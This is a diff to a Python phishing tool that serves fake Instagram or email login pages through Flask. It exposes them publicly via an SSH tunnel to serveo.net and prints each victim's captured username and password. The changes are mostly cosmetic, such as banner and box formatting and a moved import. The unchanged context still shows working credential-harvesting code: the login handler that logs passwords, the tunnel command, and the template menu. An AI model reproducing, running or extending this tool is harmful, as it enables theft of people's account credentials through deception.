@@ -6,7 +6,6 @@ import subprocess
 import threading
 import itertools
 import time
-from flask import Flask, request, send_from_directory
 from datetime import datetime
 
 # -------- Auto-install Flask --------
@@ -46,11 +45,12 @@ def banner():
 |  __/|  _ <| |_| | | |_| |
 |_|   |_| \\_\\\\___/  |____/ 
 
-{cyan}            PRO D
-{pink}         Created by Dhani v1.0{reset}
+{cyan}        PRO D
+{pink}   Created by Dhani v1.0{reset}
 """)
 
 # -------- Flask App --------
+from flask import Flask, request, send_from_directory
 app = Flask(__name__)
 selected_html = "1.html"  # default HTML file
 
@@ -68,13 +68,13 @@ def login():
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     print(f"""{pink}
-╔══════════════════════════════╗
-║ {cyan}Username: {ylo}{username}{reset}
-║ {cyan}Password: {ylo}{password}{reset}
-║ {cyan}Time    : {ylo}{timestamp}{reset}
-╚══════════════════════════════╝
+╔══════════════════════╗
+║ {cyan}Username:{ylo} {username}{reset}
+║ {cyan}Password:{ylo} {password}{reset}
+║ {cyan}Time    :{ylo} {timestamp}{reset}
+╚══════════════════════╝
 """)
-    return "something wrong try again later :("
+    return "Something went wrong again later :("
 
 # -------- Find free port --------
 def get_free_port(start_port=8080):
@@ -91,18 +91,18 @@ def spinner():
     for c in itertools.cycle(['|', '/', '-', '\\']):
         if stop_spinner:
             break
-        sys.stdout.write(f"\r{pink}[{cyan}*{pink}] Waiting for logins... {c}{reset} ")
+        sys.stdout.write(f"\r{pink}[{cyan}*{pink}] Waiting for logins... {c}{reset}")
         sys.stdout.flush()
         time.sleep(0.1)
-    sys.stdout.write(f"\r{grn}[✓] Login captured!            {reset}\n")
+    sys.stdout.write(f"\r{grn}[✓] Login captured!         {reset}\n")
 
 # -------- Run Flask + Serveo --------
 def run_server():
     port = get_free_port(8080)
 
-    print(f"{pink}╔══════════════════════════════╗")
-    print(f"{pink}║ {cyan}Starting server...{reset}")
-    print(f"{pink}╚══════════════════════════════╝{reset}\n")
+    print(f"{pink}╔══════════════════════╗")
+    print(f"║ {cyan}Starting server...{reset}")
+    print(f"{pink}╚══════════════════════╝{reset}\n")
 
     # Start Serveo tunnel in background
     ssh_cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
@@ -113,9 +113,9 @@ def run_server():
         if "Forwarding HTTP" in line:
             public_url = line.strip().split()[-1]
             print(f"""{grn}
-╔══════════════════════════════╗
-║ {cyan}Public Link: {ylo}{public_url}{reset}
-╚══════════════════════════════╝
+╔══════════════════════╗
+║ {cyan}Public Link:{ylo} {public_url}{reset}
+╚══════════════════════╝
 """)
 
             # Start spinner animation
@@ -130,12 +130,12 @@ if __name__ == "__main__":
 
     # ----- menu -----
     print(f"""{pink}
-╔══════════════════════════════╗
-║ {cyan}Choose Page Template{pink}        
-╠══════════════════════════════╣
-║ [1] instagram                
-║ [2] email                  
-╚══════════════════════════════╝
+╔══════════════════════╗
+║ {cyan}Choose Page Template{pink}
+╠══════════════════════╣
+║ [1] instagram
+║ [2] email
+╚══════════════════════╝
 {reset}""")
     choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
     selected_html = "11.html" if choice == "1" else "2.html"
